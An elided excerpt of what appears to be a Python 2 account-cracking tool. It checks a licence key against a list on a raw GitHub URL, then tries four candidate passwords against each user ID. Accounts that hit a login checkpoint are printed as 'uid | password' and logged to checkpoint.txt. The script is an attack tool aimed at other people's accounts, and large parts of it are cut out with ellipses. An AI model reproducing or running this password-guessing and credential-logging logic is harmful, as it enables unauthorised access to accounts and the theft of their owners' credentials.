...
def reg():
    ...
    try:
        to = open('/sdcard/.Khan.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/marwattricks398/hcrack/master/server.txt').text
    if to in r:
        print logo
        print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                print ' \x1b[1;33m[NNM-CP] ' + c + user + ' | ' + pass1 + '\x1b[0;97m'
                ...
                if 'loc' in q:
                    ...
                    print ' \x1b[1;33m[NNM-CP] ' + c + user + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    ...
                    if 'loc' in q:
                        ...
                        print ' \x1b[1;33m[NNM-CP] ' + c + user + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        ...
                        if 'loc' in q:
                            ...
                            print ' \x1b[1;33m[NNM-CP] ' + c + user + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('checkpoint.txt', 'a')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                print ' \x1b[1;33m[NNM-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('checkpoint.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                if 'loc' in q:
                    ...
                    print ' \x1b[1;33m[NNM-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'loc' in q:
                        ...
                        print ' \x1b[1;33m[NNM-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'loc' in q:
                            ...
                            print ' \x1b[1;33m[NNM-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('checkpoint.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
